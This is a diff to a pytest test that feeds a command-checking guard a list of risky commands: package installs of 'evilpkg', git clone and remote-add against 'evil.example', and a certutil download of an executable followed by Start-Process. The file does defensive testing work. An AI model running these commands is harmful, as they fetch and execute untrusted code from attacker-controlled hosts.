@@ -106,7 +106,7 @@ def test_localhost_and_plain_ips_are_not_opaque(cache):
 @pytest.mark.parametrize("cmd", [
     "pip3 install evilpkg", "pipx install evilpkg", "uvx evilpkg", "yarn add evilpkg", "pnpm add evilpkg",
     "bun add evilpkg", "gem install evilpkg", "cargo install evilpkg",
-    "git fetch origin", "git pull", "git push origin main", "git submodule update --init",
+    "git clone git@evil.example:x/y.git", "git remote add x git@evil.example:y.git",
     "docker pull evil/image", "brew install evilpkg",
     "certutil -urlcache -f -split http://$H/x.exe", "Start-Process $u",
 ])
